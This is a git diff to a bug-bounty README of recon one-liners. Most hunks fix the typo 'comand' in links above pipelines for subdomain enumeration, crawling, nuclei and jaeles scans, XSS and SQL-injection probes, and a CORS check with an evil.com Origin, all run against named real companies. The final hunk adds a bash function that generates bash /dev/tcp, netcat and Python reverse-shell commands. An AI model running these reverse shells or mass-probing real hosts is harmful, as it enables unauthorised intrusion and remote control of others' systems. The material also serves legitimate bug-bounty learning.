@@ -17,6 +17,7 @@ Our main goal is to share tips from some well-known bughunters. Using recon meth
 - [@jeff_foley](https://twitter.com/@jeff_foley)
 - [@NahamSec](https://twitter.com/NahamSec)
 - [@j3ssiejjj](https://twitter.com/j3ssiejjj)
+- [@0day](https://instagram.com/0day)
 
 
 ## Scripts that need to be installed
@@ -117,7 +118,7 @@ Using python3 to search subdomains, httpx filter hosts by up status-code respons
 
 ###  Search SQLINJECTION using qsreplace search syntax error
 
-- [Explained comand](https://bit.ly/3hxFWS2)
+- [Explained command](https://bit.ly/3hxFWS2)
 
 ```bash
 grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
@@ -125,7 +126,7 @@ grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -
 
 ###  Search subdomains using jldc
 
-- [Explained comand](https://bit.ly/2YBlEjm)
+- [Explained command](https://bit.ly/2YBlEjm)
 
 ```bash
 curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
@@ -133,7 +134,7 @@ curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/
 
 ###  Search subdomains in assetfinder using hakrawler spider to search links in content responses
 
-- [Explained comand](https://bit.ly/3hxRvZw)
+- [Explained command](https://bit.ly/3hxRvZw)
 
 ```bash
 assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
@@ -141,7 +142,7 @@ assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follo
 
 ###  Search subdomains in cert.sh
 
-- [Explained comand](https://bit.ly/2QrvMXl)
+- [Explained command](https://bit.ly/2QrvMXl)
 
 ```bash
 curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
@@ -149,7 +150,7 @@ curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | s
 
 ###  Search subdomains in cert.sh assetfinder to search in link /.git/HEAD
 
-- [Explained comand](https://bit.ly/3lhFcTH)
+- [Explained command](https://bit.ly/3lhFcTH)
 
 ```bash
 curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
@@ -159,7 +160,7 @@ curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_valu
 ```
 ###  Collect js files from hosts up by gospider
 
-- [Explained comand](https://bit.ly/3aWIwyI)
+- [Explained command](https://bit.ly/3aWIwyI)
 
 ```bash
 xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
@@ -167,7 +168,7 @@ xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs
 
 ###  Subdomain search Bufferover resolving domain to httpx
 
-- [Explained comand](https://bit.ly/3lno9j0)
+- [Explained command](https://bit.ly/3lno9j0)
 
 ```bash
 curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
@@ -176,7 +177,7 @@ curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/
 ###  Using gargs to gospider search with parallel proccess
 - [Gargs](https://github.com/brentp/gargs)
 
-- [Explained comand](https://bit.ly/2EHj1FD)
+- [Explained command](https://bit.ly/2EHj1FD)
 
 ```bash
 httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
@@ -184,7 +185,7 @@ httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 
 
 ###  Injection xss using qsreplace to urls filter to gospider
 
-- [Explained comand](https://bit.ly/3joryw9)
+- [Explained command](https://bit.ly/3joryw9)
 
 ```bash
 gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
@@ -192,7 +193,7 @@ gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 
 ###  Extract URL's to apk
 
-- [Explained comand](https://bit.ly/2QzXwJr)
+- [Explained command](https://bit.ly/2QzXwJr)
 
 ```bash
 apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
@@ -200,7 +201,7 @@ apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ |
 
 ###  Chaos to Gospider
 
-- [Explained comand](https://bit.ly/3gFJbpB)
+- [Explained command](https://bit.ly/3gFJbpB)
 
 ```bash
 chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
@@ -217,7 +218,7 @@ xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" 
 
 ###  Using shodan & Nuclei
 
-- [Explained comand](https://bit.ly/3jslKle)
+- [Explained command](https://bit.ly/3jslKle)
 
 Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column.
 httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.
@@ -228,7 +229,7 @@ shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /n
 
 ###  Open Redirect test using gf.
 
-- [Explained comand](https://bit.ly/3hL263x)
+- [Explained command](https://bit.ly/3hL263x)
 
 echo is a command that outputs the strings it is being passed as arguments. What to Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. GF? A wrapper around grep to avoid typing common patterns and anew Append lines from stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, removes duplicates.
 
@@ -238,14 +239,14 @@ echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirec
 
 ###  Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".
 
-- [Explained comand](https://bit.ly/2QQfY0l)
+- [Explained command](https://bit.ly/2QQfY0l)
 
 ```bash
 shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
 ```
 ###  Using Chaos to jaeles "How did I find a critical today?.
 
-- [Explained comand](https://bit.ly/2YXiK8N)
+- [Explained command](https://bit.ly/2YXiK8N)
 
 To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates. 
 
@@ -255,7 +256,7 @@ chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles
 
 ###  Using shodan to jaeles
 
-- [Explained comand](https://bit.ly/2Dkmycu)
+- [Explained command](https://bit.ly/2Dkmycu)
 
 ```bash
 domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
@@ -263,7 +264,7 @@ domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1
 
 ###  Search to files using assetfinder and ffuf
 
-- [Explained comand](https://bit.ly/2Go3Ba4)
+- [Explained command](https://bit.ly/2Go3Ba4)
 
 ```bash
 assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
@@ -271,7 +272,7 @@ assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh 
 
 ###  HTTPX using new mode location and injection XSS using qsreplace.
 
-- [Explained comand](https://bit.ly/2Go3Ba4)
+- [Explained command](https://bit.ly/2Go3Ba4)
 
 ```bash
 httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
@@ -279,7 +280,7 @@ httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{pri
 
 ###  Grap internal juicy paths and do requests to them.
 
-- [Explained comand](https://bit.ly/357b1IY)
+- [Explained command](https://bit.ly/357b1IY)
 
 ```bash
 export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
@@ -287,7 +288,7 @@ export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinde
 
 ###  Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.
 
-- [Explained comand](https://bit.ly/2R2gNn5)
+- [Explained command](https://bit.ly/2R2gNn5)
 
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
@@ -295,7 +296,7 @@ wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/
 
 ###  Using to findomain to SQLINJECTION.
 
-- [Explained comand](https://bit.ly/2ZeAhcF)
+- [Explained command](https://bit.ly/2ZeAhcF)
 
 ```bash
 findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
@@ -303,7 +304,7 @@ findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sq
 
 ###  Jaeles scan to bugbounty targets.
 
-- [Explained comand](https://bit.ly/3jXbTnU)
+- [Explained command](https://bit.ly/3jXbTnU)
 
 ```bash
 wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
@@ -311,7 +312,7 @@ wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/
 
 ###  JLDC domain search subdomain, using rush and jaeles.
 
-- [Explained comand](https://bit.ly/3hfNV5k)
+- [Explained command](https://bit.ly/3hfNV5k)
 
 ```bash
 curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
@@ -319,14 +320,14 @@ curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\
 
 ###  Chaos to search subdomains check cloudflareip scan port.
 
-- [Explained comand](https://bit.ly/3hfNV5k)
+- [Explained command](https://bit.ly/3hfNV5k)
 
 ```bash
 chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
 ```
 ###  Search JS to domains file.
 
-- [Explained comand](https://bit.ly/2Zs13yj)
+- [Explained command](https://bit.ly/2Zs13yj)
 
 ```bash
 cat FILE TO TARGET | httpx -silent | subjs | anew
@@ -334,7 +335,7 @@ cat FILE TO TARGET | httpx -silent | subjs | anew
 
 ###  Search JS using assetfinder, rush and hakrawler.
 
-- [Explained comand](https://bit.ly/3ioYuV0)
+- [Explained command](https://bit.ly/3ioYuV0)
 
 ```bash
 assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
@@ -342,7 +343,7 @@ assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --foll
 
 ###  Search to CORS using assetfinder and rush
 
-- [Explained comand](https://bit.ly/33qT71x)
+- [Explained command](https://bit.ly/33qT71x)
 
 ```bash
 assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null"
@@ -350,10 +351,16 @@ assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j2
 
 ###  Search to js using hakrawler and rush & unew
 
-- [Explained comand](https://bit.ly/2Rqn9gn)
+- [Explained command](https://bit.ly/2Rqn9gn)
 
 ```bash
 tac hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
+```
+
+###  Common Reverse Shell Alias
+- [How To Install](https://github.com/ryanrohypnol/Reverse-Shell-Bash-Alias)
+```bash
+function reverse { local port=443;adaptors=$(ip a | egrep ^[0-9]+ | cut -d" " -f 2 | sed 's/://g');OPTIND=1;usage()( echo "reverse [-i <interface>] [-l <language>] [-p <port>]";printf "Language Options:\n  bash\n  nc\n  python\n\n" );while getopts ":i:l:p:h" options; do case "${options}" in i)local interface=${OPTARG};if ! echo $interface |  egrep -qo "public"; then if ! echo $adaptors | grep -qo "$interface"; then echo "Interface "${OPTARG}" does not exist";usage;return;fi;fi;;l)local language=${OPTARG};;     p)local port=${OPTARG};;h)usage;return;;:)echo "Error: -${OPTARG} requires an argument";usage;return;;*)echo "Unknown Switch: -${OPTARG}";usage;return;;esac;done;if [ -z $interface ]; then if ip a | egrep -qo "tun0"; then local interface="tun0";elif echo $interface | egrep -qo "public" ; then local interface="public";elif ip a | egrep -qo "eth0"; then local interface="eth0";elif ip a | egrep -qo "ens33"; then local interface="ens33";else local interface="lo";fi;fi;if echo $interface | egrep -qo "public"; then local ip=$(wget -qO - icanhazip.com);else local ip=$(ip a show $interface | egrep -o "([0-9]{1,3}\.){3}[0-9]{1,3}" | head -1);fi;local randName=$(head -4 /dev/urandom | sha256sum | base64 | head -c 5);declare -A shells=( ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1" ["nc"]="mkfifo /tmp/$randName; nc $ip $port 0</tmp/$randName | /bin/sh >/tmp/$randName 2>&1; rm /tmp/$randName" ["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" );if [ -z $language ]; then printf "\n";for i in "${shells[@]}";do printf "$i\n\n";done;return;fi;printf "\n${shells[$language]}\n\n"; }
 ```
 
 # Project
